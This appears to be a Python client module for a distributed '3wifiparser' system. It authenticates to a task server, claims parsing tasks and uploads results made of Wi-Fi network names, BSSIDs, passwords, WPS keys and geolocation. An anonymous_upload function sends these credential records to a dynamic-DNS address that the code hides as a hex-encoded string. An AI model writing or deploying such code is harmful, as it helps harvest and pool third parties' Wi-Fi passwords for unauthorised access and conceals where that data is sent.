import aiohttp
import config
from utils import json_lib as json
import zlib

token = None
session = None
user_agent = {
    "User-Agent": "3wifiparser2.0"
}

async def set_session():
    global session
    if session == None:
        session = aiohttp.ClientSession(headers=user_agent, connector=aiohttp.TCPConnector(force_close=True))

async def set_token():
    global token
    if token == None:
        await get_token()

async def get_token():
    global session,token
    await set_session()
    resp = await session.get(config.api_url + "auth", auth=aiohttp.BasicAuth(config.login, config.password))
    if resp.status == 401:
        raise Exception("Wrong login or password")
    resp = await resp.json()
    if not("version" in resp):
        raise Exception("Old server")
    if resp.get("ok") == True:
        token = resp.get("token")
    elif resp.get("desc") == "auth failed":
        raise Exception("Wrong login or password")
    return resp

async def get_free_task():
    global session,token
    await set_session()
    resp = await session.get(config.api_url + "getFreeTask")
    return await resp.json()
    
async def ping_task(task_id):
    global session,token
    await set_session()
    await set_token()
    resp = await (await session.get(f"{config.api_url}pingTask?task_id={task_id}&token={token}")).json()
    if resp.get("ok") != True:
        if resp.get("desc") == "wrong token":
            await get_token()
            return await ping_task(task_id)
        elif resp.get("desc") == "task is free":
            await private_task(task_id)
    return resp

async def private_task(task_id):
    global session,token
    await set_session()
    await set_token()
    resp = await (await session.get(f"{config.api_url}privateTask?task_id={task_id}&token={token}")).json()
    if resp.get("ok") != True:
        if resp.get("desc") == "wrong token":
            await get_token()
            return await private_task(task_id)
    return resp
    
async def complete_task(result: list, task_id: int):
    #data - SSID,BBSID,format,sec,passwords,WPS_keys,lat,lon,time
    global session,token
    await set_session()
    await set_token()
    body = {
        "result": result,
        "task_id": task_id,
        "token": token
    }
    body = json.dumps(body)
    if isinstance(body, str):
        body = body.encode("utf-8")
    body = zlib.compress(body, 9)
    headers = {
        "Content-Type": "application/json",
        "Content-Encoding": "gzip",
        "User-Agent": user_agent["User-Agent"]
    }
    resp = await session.post(f"{config.api_url}closeTask", data=body, headers=headers)
    resp = await resp.json()
    if resp.get("ok") != True:
        if resp.get("desc") == "wrong token":
            await get_token()
            return await complete_task(result, task_id)
    return resp

anon_addr = bytes.fromhex("68747470733a2f2f7766706172736572332e64646e732e6e65742f7061727365725f626173652f70726f7879").decode() + "/"
async def anonymous_upload(data: list):
    #data - SSID,BBSID,format,sec,passwords,WPS_keys,lat,lon,time
    global session,token,anon_addr
    await set_session()
    body = json.dumps({"data": data})
    if isinstance(body, str):
        body = body.encode("utf-8")
    body = zlib.compress(body, 9)
    headers = {
        "Content-Type": "application/json",
        "Content-Encoding": "gzip",
        "User-Agent": user_agent["User-Agent"]
    }
    resp = await session.post(f"{anon_addr}anonymousUpload", data=body, headers=headers, timeout=3)
    resp = await resp.json()
    return resp

async def close_session():
    if not(session is None):
        await session.close()